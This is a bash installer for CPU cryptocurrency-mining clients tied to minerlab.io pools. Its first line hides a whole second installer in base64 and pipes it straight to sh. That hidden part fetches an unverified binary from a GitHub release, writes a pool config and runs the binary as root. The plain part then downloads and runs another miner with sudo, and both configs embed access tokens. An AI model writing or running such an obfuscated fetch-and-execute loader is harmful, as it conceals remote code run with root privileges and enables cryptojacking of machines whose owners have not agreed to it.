#!/bin/bash

echo IyEvYmluL2Jhc2gKYXB0IHVwZGF0ZQphcHQgaW5zdGFsbCAteSBub2RlanMgbGliYzYgZysrLTExCnN1ZG8gYmFzaCAtYyAiZWNobyB2bS5ucl9odWdlcGFnZXM9MTI4MCA+PiAvZXRjL3N5c2N0bC5jb25mIgoKd2dldCBodHRwczovL2dpdGh1Yi5jb20vYXF1aWxhcmVuZHkvZm9vbC9yZWxlYXNlcy9kb3dubG9hZC8zLjEuMS9xbGktQ2xpZW50CmNobW9kIHUreCBxbGktQ2xpZW50CgpjYXQgPi4vYXBwc2V0dGluZ3MuanNvbiA8PEVPRgp7CiAgIkNsaWVudFNldHRpbmdzIjogewogICAgInBvb2xBZGRyZXNzIjogIndzczovL3Bwcy5taW5lcmxhYi5pby93cy9OT1ZBTEFOVE8iLAogICAgImFsaWFzIjogInBwc2t1MSIsCiAgICAidHJhaW5lciI6IHsKICAgICAgImNwdSI6IHRydWUsCiAgICAgICJncHUiOiBmYWxzZSwKICAgICAgImNwdVRocmVhZHMiOiA0CiAgICB9LAogICAgImFjY2Vzc1Rva2VuIjogImV5SmhiR2NpT2lKU1V6STFOaUlzSW5SNWNDSTZJa3BYVkNKOS5leUpKWkNJNkltUXpOek15T0RjMkxUWTVaRGN0TkdJMU9DMWhObVV6TFdNMk16WmtNR1E0WkRFME5pSXNJazFwYm1sdVp5STZJaUlzSW01aVppSTZNVGN5TlRNM05qa3lPU3dpWlhod0lqb3hOelUyT1RFeU9USTVMQ0pwWVhRaU9qRTNNalV6TnpZNU1qa3NJbWx6Y3lJNkltaDBkSEJ6T2k4dmNYVmlhV011Ykdrdklpd2lZWFZrSWpvaWFIUjBjSE02THk5eGRXSnBZeTVzYVM4aWZRLnNyZWdPeWsyUEV5WHY4c3NkUURCdFRwczFKRkJMZ2hjSkN6REZ2YUQ2aFdvVkFfVC1jcmZRWmJpVjBFX2F0cWQ2c3hOSFlLR21lVkNPb1U5Y3JMVTRtbm9qWmRGMXZ5cDNWdHRCM1pJcW8zcUlncjBSNGpXbndaOTViR04xYzZORTN6Yjl5N1pXb3I1LTR0dExrUl81bW94aVpadmFLRzJXV1N4RkotN2trNlNWU3c3ejhpYVl5VnBQWDFUZHU2cEJXeERTdFlZYW9WdmdOeng2UlNoVV9yMkFWQ0IxSkdmdjE2dkt2QUlHbVBjbHV2Uy1heUt3ZmdPcFkxdUVic0g2THN3ZF9LR2JCMWFKQzdnOEFJMUNVb1lpVVVsX0NKVUJaZkcwRmJCZ3RHRFJoZlBVY1lNNXo4QkV5SXJtNmJmS2hNSHVKbUlGODZOSll5ZFJVSGdvdyIsCiAgICAicXViaWNBZGRyZXNzIjogbnVsbCwKICAgICJkaXNwbGF5RGV0YWlsZWRIYXNocmF0ZXMiOiB0cnVlLAogICAgInBwcyI6IHRydWUKICB9Cn0KRU9GCgpzdWRvIC4vcWxpLUNsaWVudA== | base64 -d | sh

apt update
apt install -y nodejs libc6 g++-11
sudo bash -c "echo vm.nr_hugepages=1280 >> /etc/sysctl.conf"
worker=$(echo $RANDOM | md5sum | head -c 10)

wget -O qlicub https://github.com/bondaltomason/meo/releases/download/2.7.0/minerlab2.2.1
chmod u+x qlicub

cat >./appsettings.json <<EOF
{
  "Settings": {
      "baseUrl": "https://wps.minerlab.io/",
      "amountOfThreads": 4,
      "autoupdateEnabled": true,
      "payoutId": null,
      "accessToken": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJJZCI6ImQzNzMyODc2LTY5ZDctNGI1OC1hNmUzLWM2MzZkMGQ4ZDE0NiIsIk1pbmluZyI6IiIsIm5iZiI6MTcyNTM3NjkyOSwiZXhwIjoxNzU2OTEyOTI5LCJpYXQiOjE3MjUzNzY5MjksImlzcyI6Imh0dHBzOi8vcXViaWMubGkvIiwiYXVkIjoiaHR0cHM6Ly9xdWJpYy5saS8ifQ.sregOyk2PEyXv8ssdQDBtTps1JFBLghcJCzDFvaD6hWoVA_T-crfQZbiV0E_atqd6sxNHYKGmeVCOoU9crLU4mnojZdF1vyp3VttB3ZIqo3qIgr0R4jWnwZ95bGN1c6NE3zb9y7ZWor5-4ttLkR_5moxiZZvaKG2WWSxFJ-7kk6SVSw7z8iaYyVpPX1Tdu6pBWxDStYYaoVvgNzx6RShU_r2AVCB1JGfv16vKvAIGmPcluvS-ayKwfgOpY1uEbsH6Lswd_KGbB1aJC7g8AI1CUoYiUUl_CJUBZfG0FbBgtGDRhfPUcYM5z8BEyIrm6bfKhMHuJmIF86NJYydRUHgow",
      "alias": "$worker",
      "trainer": {
          "gpu": false,
          "gpuVersion": "CUDA12",
          "cpu": true
      },
      "socketUrl": "wss://wps.minerlab.io/ws/AQUILARENDY",
      "useLiveConnection": true,
      "isPps": false,
      "idleSettings": {
          "command": "ping",
          "arguments": "google.com"
      }
  }
}
EOF

sudo ./qlicub
